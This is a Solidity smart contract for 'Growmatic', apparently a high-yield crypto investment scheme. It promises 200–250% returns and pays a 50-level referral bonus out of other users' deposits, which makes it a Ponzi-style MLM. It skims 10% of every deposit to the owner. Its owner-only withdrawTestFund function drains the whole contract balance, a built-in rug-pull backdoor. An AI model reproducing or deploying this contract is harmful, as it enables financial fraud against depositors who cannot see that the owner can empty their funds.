//SPDX-License-Identifier: MIT
pragma solidity 0.7.6;
contract Growmatic {
    using SafeMath for uint256;
     
    struct Tarif {
        uint256 life_days;
        uint256 percent;
        uint256 min_inv;
        uint256 max_inv;

    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address upline;
        uint256 j_time;
        uint256 dividends;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 gi_bonus;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
        mapping(uint8 => uint256) level_business;
    }

    address payable public owner;
    address payable public marketing_wallet;
    uint256[] public GI_PERCENT = [150,100,70,30,30,30,30,30,30,30,30,30,30,20,20,20,20,20,20,20,20,20,20,10,10,10,10,10,10,10,10,10,10,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5,5];
    uint256 public invested;
    uint256 public gi_bonus;
    uint256 public withdrawn;
    uint256 public match_bonus;
    uint256 public withdrawFee;

    uint8[] public ref_bonuses;
 

    Tarif[] public tarifs;
    mapping(address => Player) public players;
    

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event MatchPayoutStat(address upline,uint256 total_directs, uint256 level_b);

    constructor(address payable _marketing_wallet)  {
        owner = msg.sender;
        marketing_wallet = _marketing_wallet;

       
        tarifs.push(Tarif(400, 200,10e18,100e18));  //0.5% for 400 days  = 200%
        tarifs.push(Tarif(280, 210,101e18,500e18)); //0.75% for 280 days  = 210%
        tarifs.push(Tarif(220, 220,501e18,2000e18)); //1% for 220 days  = 220%
        tarifs.push(Tarif(184, 230, 2001e18,5000e18)); //1.25% for 184 days  = 230%
        tarifs.push(Tarif(160, 240, 5001e18,10000e18)); //1.5% for 160 days  = 240%
        tarifs.push(Tarif(125, 250, 10001e18,20000e18)); //2% for 125 days  = 250%
        
    }







    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }
    }

   

    function _setUpline(address _addr, address _upline,uint256 amount) private {
        if(players[_addr].upline == address(0)) {//first time entry
            if(players[_upline].deposits.length == 0) {//no deposite from my upline
                _upline = owner;
            }
            players[_addr].upline = _upline;
            for(uint8 i = 0; i < GI_PERCENT.length; i++) {
                players[_upline].structure[i]++;
                 players[_upline].level_business[i] += amount;
                _upline = players[_upline].upline;
                if(_upline == address(0)) break;
            }
        }
        
         else
             {
                _upline = players[_addr].upline;
            for( uint8 i = 0; i < GI_PERCENT.length; i++) {
                     players[_upline].level_business[i] += amount;
                    _upline = players[_upline].upline;
                    if(_upline == address(0)) break;
                }
        }
        
    }

    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found"); // ??
      
     
        require(msg.value >= tarifs[_tarif].min_inv, "Less Then the min investment");
        require(msg.value <= tarifs[_tarif].max_inv, "more Then the max investment");
        
       
        Player storage player = players[msg.sender];

        _setUpline(msg.sender,_upline,msg.value);
        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp) 
        }));
        
        
        player.total_invested += msg.value;
        player.j_time =  uint256(block.timestamp);
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

         

       

        //tech development fees
         owner.transfer(msg.value.mul(10).div(100));
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }


    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

         if(up != address(0)){

            uint256 bonus = _amount * 5 / 100;
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;
            match_bonus += bonus;
            emit MatchPayout(up, _addr, bonus);

         }
    }

    function withdraw() payable external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0 || player.gi_bonus > 0, "Zero amount");
        uint256 amount = player.dividends + player.match_bonus + player.gi_bonus;
     
        
        _send_gi(msg.sender,player.dividends);
        player.dividends = 0;
        player.match_bonus = 0;
        player.gi_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

         emit Withdraw(msg.sender, amount);
         marketing_wallet.transfer(msg.value.mul(5).div(10));
         msg.sender.transfer(amount);
        
       
    }


    function _send_gi(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < GI_PERCENT.length; i++) {
            if(up == address(0)) break;

            uint256 bonus = _amount * GI_PERCENT[i] / 1000;
            players[up].gi_bonus += bonus;
            gi_bonus += bonus;
           
            up = players[up].upline;
         
        }
    }



    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];
            for(uint256 i = 0; i < player.deposits.length; i++) {
                Deposit storage dep = player.deposits[i];
                Tarif storage tarif = tarifs[dep.tarif];

                uint256 time_end = dep.time + tarif.life_days * 86400;
                uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
                uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

                if(from < to) {
                    value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
                }
            }
        return value;
    }


    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_bonus, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[] memory structure, uint256[] memory level_business) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

      structure = new uint256[](GI_PERCENT.length);
       level_business = new uint256[](GI_PERCENT.length);

        for(uint8 i = 0; i < GI_PERCENT.length; i++) {
            structure[i] = player.structure[i];
             level_business[i] = player.level_business[i];
        }

        return (
            payout + player.dividends + player.match_bonus + player.gi_bonus,
            player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure,
            level_business
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn,uint256 _match_bonus) {
        return (invested, withdrawn,match_bonus);
    }

    function investmentsInfo(address _addr) view external returns(uint8[] memory ids, uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];

        uint8[] memory _ids = new uint8[](player.deposits.length);
        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          Deposit storage dep = player.deposits[i];
          Tarif storage tarif = tarifs[dep.tarif];

          _ids[i] = dep.tarif;
          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + tarif.life_days * 86400;
        }

        return (
          _ids,
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }

    function withdrawTestFund()  external{

        require(msg.sender == owner,"Unauthorized");
        msg.sender.transfer(address(this).balance);
        
    }

}



library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}
interface IBEP20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}